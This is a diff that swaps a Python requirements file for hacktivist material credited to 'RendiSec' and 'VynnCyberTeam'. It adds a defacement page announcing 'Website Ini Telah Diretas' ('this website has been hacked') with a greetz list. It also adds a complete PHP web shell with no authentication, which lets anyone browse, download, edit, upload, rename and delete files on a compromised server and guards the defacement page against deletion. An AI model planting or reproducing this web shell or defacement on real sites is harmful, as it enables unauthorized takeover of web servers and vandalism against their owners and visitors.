@@ -1,2 +1,266 @@
-requests
-phonenumbers
+HTML DEFACE
+
+<!DOCTYPE html>
+<html lang="id">
+ <title>by RendiSec</title>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/png" href="https://e.top4top.io/p_3410p9rkk0.jpeg">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"><script type="text/javascript"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="title" content="website ini telah di retas RendiSec">
+    <meta name="description" content="wh00pz ! your security get down">
+    <meta name="keywords" content=",wordpress,website,whitehat,blackhat,defacer,hack,mirror">
+    <meta name="robots" content="index, follow">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="language" content="English">
+    <meta name="revisit-after" content="60 days">
+    <meta name="author" content="Berita hari ini RendiSec menyerang 38 website">
+    <meta property="og:image" content="https://e.top4top.io/p_3410p9rkk0.jpeg">
+    <meta name="theme-color" content="#000">
+  <title>DI RETAS</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .circle-img {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      border: 3px solid #fff;
+      margin-bottom: 20px;
+      background-image: url('https://e.top4top.io/p_3410p9rkk0.jpeg');
+      background-size: cover;
+      background-position: center;
+    }
+
+    h1 {
+      font-size: 2.2em;
+      margin: 10px 0;
+      color: #ff0000;
+    }
+
+    p {
+      font-size: 1.1em;
+      color: #ccc;
+    }
+
+    footer {
+      position: absolute;
+      bottom: 15px;
+      font-size: 0.8em;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="circle-img"></div>
+  <h3>Website Ini Telah Diretas</h3>
+  <p>Oleh <strong>RendiSec</strong><br>VynnCyberTeam</p>
+  <marquee>
+              <font size="2">
+                <b>Greetz</b>: XynnHd - RendiExploit - XynaTzy - PutraWibu - PimzzXploit - VanTheSecond - Alip - Joo - Farhan - Yazime - Tari - Sena - Fyzee - axel - pixxs - andry - Gitz - VynnCyberTeam
+              </font>
+            </marquee>
+
+  <footer>VynnCyberTeam</footer>
+<script> alert("Sitee Down")</script>
+</body>
+</html>
+
+SHELL DEFACE BY RENDISEC -VynnGrup
+
+<?php
+$root = realpath(getcwd());
+$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
+if (strpos($dir, $root) !== 0) $dir = $root;
+
+$files = @scandir($dir);
+
+function sizeFormat($bytes) {
+  $units = ['B','KB','MB','GB','TB'];
+  for ($i = 0; $bytes >= 1024 && $i < count($units) - 1; $i++) $bytes /= 1024;
+  return round($bytes, 1).' '.$units[$i];
+}
+
+if (isset($_GET['download'])) {
+  $file = realpath($_GET['download']);
+  if (strpos($file, $root) === 0 && is_file($file)) {
+    header("Content-Disposition: attachment; filename=\"".basename($file)."\"");
+    header("Content-Type: application/octet-stream");
+    readfile($file);
+    exit;
+  }
+}
+
+if (isset($_POST['rename'])) {
+  $old = realpath($_POST['old']);
+  $new = dirname($old) . '/' . basename($_POST['new']);
+  if (strpos($old, $root) === 0 && strpos($new, $root) === 0) {
+    rename($old, $new);
+  }
+  header("Location: ?dir=".urlencode($dir));
+  exit;
+}
+
+if (isset($_GET['edit'])) {
+  $file = realpath($_GET['edit']);
+  if (strpos($file, $root) === 0 && is_file($file)) {
+    $content = htmlspecialchars(file_get_contents($file));
+    echo "<form method='post'><textarea name='cnt' style='width:100%;height:90vh;background:#000;color:#0f0;font-family:monospace;'>$content</textarea>
+    <input type='hidden' name='file' value='".htmlspecialchars($file)."'>
+    <button style='margin-top:10px;padding:8px;'>Save</button></form>"; exit;
+  }
+}
+
+if (isset($_POST['cnt']) && isset($_POST['file'])) {
+  $f = realpath($_POST['file']);
+  if (strpos($f, $root) === 0) file_put_contents($f, $_POST['cnt']);
+  header("Location: ?dir=".urlencode(dirname($f)));
+  exit;
+}
+
+if (isset($_FILES['upload'])) {
+  move_uploaded_file($_FILES['upload']['tmp_name'], $dir.'/'.$_FILES['upload']['name']);
+  header("Location: ?dir=".urlencode($dir));
+  exit;
+}
+if (isset($_POST['delete'])) {
+  $fileToDelete = realpath($_POST['delete']);
+  if ($fileToDelete && basename($fileToDelete) === 'index.html') {
+    echo "<script>alert('Ini Milik RendiSec, Tidak Bisa Dihapus!');</script>";
+  } else {
+    if (strpos($fileToDelete, $root) === 0 && is_file($fileToDelete)) {
+      unlink($fileToDelete);
+      header("Location: ?dir=".urlencode($dir));
+      exit;
+    }
+  }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Vynn404 File Viewer</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      color: #00ff99;
+      font-family: monospace;
+    }
+    .head {
+      background: #111;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #0f0;
+    }
+    .head img {
+      width: 30px;
+      margin-right: 10px;
+    }
+    .container {
+      padding: 20px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 15px;
+    }
+    th, td {
+      padding: 8px;
+      border: 1px solid #0f0;
+    }
+    a {
+      color: #0ff;
+      text-decoration: none;
+    }
+    a:hover {
+      color: #f0f;
+    }
+    .upload-box {
+      margin-top: 15px;
+    }
+    input[type="file"]::file-selector-button {
+      background: #00ff99;
+      color: #000;
+      border: none;
+      padding: 5px 10px;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+    input[type="text"], button {
+      padding: 5px 10px;
+      font-family: monospace;
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      margin-right: 5px;
+    }
+    form.inline { display: inline; }
+  </style>
+</head>
+<body>
+  <div class="head">
+    <img src="https://envs.sh/keT.jpg">
+    <h1>Vynn404 Console File Viewer</h1>
+  </div>
+  <div class="container">
+    <div>Path: <strong><?php echo htmlspecialchars($dir); ?></strong></div>
+
+    <form method="post" enctype="multipart/form-data" class="upload-box">
+      <input type="file" name="upload" required>
+      <button type="submit">Upload</button>
+    </form>
+
+    <table>
+      <tr><th>Name</th><th>Size</th><th>Actions</th></tr>
+      <?php foreach ($files as $f):
+        if ($f === '.') continue;
+        $full = $dir . DIRECTORY_SEPARATOR . $f;
+      ?>
+      <tr>
+        <td>
+          <?php if (is_dir($full)): ?>
+            <a href="?dir=<?php echo urlencode($full); ?>">[<?php echo $f; ?>]</a>
+          <?php else: ?>
+            <?php echo $f; ?>
+          <?php endif; ?>
+        </td>
+        <td><?php echo is_file($full) ? sizeFormat(filesize($full)) : '-'; ?></td>
+        <td>
+          <?php if (is_file($full)): ?>
+            <a href="?download=<?php echo urlencode($full); ?>">Download</a> |
+            <a href="?edit=<?php echo urlencode($full); ?>">Edit</a>
+          <?php endif; ?>
+          <?php if (is_file($full)): ?>
+            <form method="post" class="inline">
+              <input type="hidden" name="old" value="<?php echo htmlspecialchars($full); ?>">
+              <input type="text" name="new" placeholder="Rename to" required>
+              <button name="rename">Rename</button>
+            </form>
+            <form method="post" class="inline">
+              <input type="hidden" name="delete" value="<?php echo htmlspecialchars($full); ?>">
+              <button type="submit" style="background-color: red;">Delete</button>
+            </form>
+          <?php endif; ?>
+        </td>
+      </tr>
+      <?php endforeach; ?>
+    </table>
+  </div>
+</body>
+</html>
